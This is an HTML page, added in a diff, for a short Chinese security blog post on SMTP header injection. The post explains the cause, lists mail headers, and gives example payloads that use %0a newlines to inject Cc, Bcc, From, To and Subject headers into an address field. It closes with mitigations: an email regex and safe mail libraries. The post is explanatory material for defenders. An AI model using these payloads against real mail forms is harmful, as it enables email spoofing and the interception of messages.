@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>smtp注入 | Leo的随便写写</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="漏洞成因：还是因为输入内容没有被完整校验或过滤，从而达到非设计预期结果 注入抄送内容可通过添加&#x2F;控制邮件头的方式，篡改邮件的发送者、抄送、密送等字段，从而达到欺骗、窃取邮件信息或劫持邮件传递的目的。常见邮件头内容    邮件头字段 含义    From 邮件的发送者   To 邮件的主要接收者   Cc 邮件的抄送接收者   Bcc 邮件的密送接收者   Subject 邮件的主题或标题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="smtp注入">
+<meta property="og:url" content="http://example.com/2024/11/21/smtp%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Leo的随便写写">
+<meta property="og:description" content="漏洞成因：还是因为输入内容没有被完整校验或过滤，从而达到非设计预期结果 注入抄送内容可通过添加&#x2F;控制邮件头的方式，篡改邮件的发送者、抄送、密送等字段，从而达到欺骗、窃取邮件信息或劫持邮件传递的目的。常见邮件头内容    邮件头字段 含义    From 邮件的发送者   To 邮件的主要接收者   Cc 邮件的抄送接收者   Bcc 邮件的密送接收者   Subject 邮件的主题或标题">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-11-21T01:15:34.000Z">
+<meta property="article:modified_time" content="2024-11-21T01:16:24.432Z">
+<meta property="article:author" content="Leo">
+<meta property="article:tag" content="安全技术">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Leo的随便写写" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Leo的随便写写</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-smtp注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/11/21/smtp%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2024-11-21T01:15:34.000Z" itemprop="datePublished">2024-11-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      smtp注入
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>漏洞成因：还是因为输入内容没有被完整校验或过滤，从而达到非设计预期结果</p>
+<h3 id="注入抄送内容"><a href="#注入抄送内容" class="headerlink" title="注入抄送内容"></a>注入抄送内容</h3><p>可通过添加&#x2F;控制邮件头的方式，篡改邮件的发送者、抄送、密送等字段，从而达到欺骗、窃取邮件信息或劫持邮件传递的目的。<br>常见邮件头内容</p>
+<table>
+<thead>
+<tr>
+<th>邮件头字段</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>From</td>
+<td>邮件的发送者</td>
+</tr>
+<tr>
+<td>To</td>
+<td>邮件的主要接收者</td>
+</tr>
+<tr>
+<td>Cc</td>
+<td>邮件的抄送接收者</td>
+</tr>
+<tr>
+<td>Bcc</td>
+<td>邮件的密送接收者</td>
+</tr>
+<tr>
+<td>Subject</td>
+<td>邮件的主题或标题</td>
+</tr>
+<tr>
+<td>Body</td>
+<td>邮件的正文内容</td>
+</tr>
+<tr>
+<td>Date</td>
+<td>邮件的发送时间</td>
+</tr>
+<tr>
+<td>Reply-To</td>
+<td>回复邮件时使用的地址</td>
+</tr>
+<tr>
+<td>Importance</td>
+<td>邮件的重要性级别</td>
+</tr>
+<tr>
+<td>MIME-Version</td>
+<td>邮件的MIME版本</td>
+</tr>
+<tr>
+<td>Content-Type</td>
+<td>邮件正文内容的类型及编码方式</td>
+</tr>
+<tr>
+<td>Content-Disposition</td>
+<td>邮件附件的处理方式</td>
+</tr>
+<tr>
+<td>Message-ID</td>
+<td>邮件的唯一标识符</td>
+</tr>
+<tr>
+<td>In-Reply-To</td>
+<td>针对哪封邮件进行回复的标识符</td>
+</tr>
+<tr>
+<td>References</td>
+<td>相关邮件的标识符列表</td>
+</tr>
+<tr>
+<td>Return-Path</td>
+<td>邮件的退回地址</td>
+</tr>
+<tr>
+<td>X-Priority</td>
+<td>邮件的优先级</td>
+</tr>
+<tr>
+<td>若<code>to_addr</code>为收件人可控，我们将其输入为<code>ntoouuzovrlfy@baybabes.com%0aCc: rocaced977@soremap.com</code>并发送</td>
+<td></td>
+</tr>
+</tbody></table>
+<ul>
+<li>%0a：换行</li>
+</ul>
+<h4 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rec@domain.com%0ACc:recipient@domain.com%0ABcc:recipient1@domain.com admin@domain.com%0AFrom:eval@domain.com From:sender@domain.com%0ATo:attacker@domain.com From:sender@domain.com%0ASubject:This’s%20Fake%20Subject</span><br></pre></td></tr></table></figure>
+
+<h4 id="规避"><a href="#规避" class="headerlink" title="规避"></a>规避</h4><ul>
+<li>输入过滤，可以使用正则表达式<code>^[\w\.-]+@[\w\.-]+\.\w+$</code>来过滤用用户提交的邮箱。</li>
+<li>使用安全的组件和库，如Python的<code>smtplib</code>、Java的<code>javax.mail</code>、PHP的<code>PHPMailer</code>等，尽可能的通过模块内置的一些函数来设定SMTP header头。</li>
+</ul>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://juejin.cn/post/7241504677911838778">https://juejin.cn/post/7241504677911838778</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/11/21/smtp%E6%B3%A8%E5%85%A5/" data-id="cm3qnnt900005t8na61uyb9om" data-title="smtp注入" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/" rel="tag">安全技术</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/11/21/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          威胁情报
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/11/21/jndi%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">jndi注入</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/" rel="tag">安全技术</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99/" rel="tag">随便写写</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/" style="font-size: 20px;">安全技术</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">漏洞复现</a> <a href="/tags/%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99/" style="font-size: 10px;">随便写写</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/11/21/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/">威胁情报</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/21/smtp%E6%B3%A8%E5%85%A5/">smtp注入</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/21/jndi%E6%B3%A8%E5%85%A5/">jndi注入</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/21/shellcode/">ShellCode和免杀入门</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/20/wp-timeclock-rce/">wp_timeclock_rce</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 Leo<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
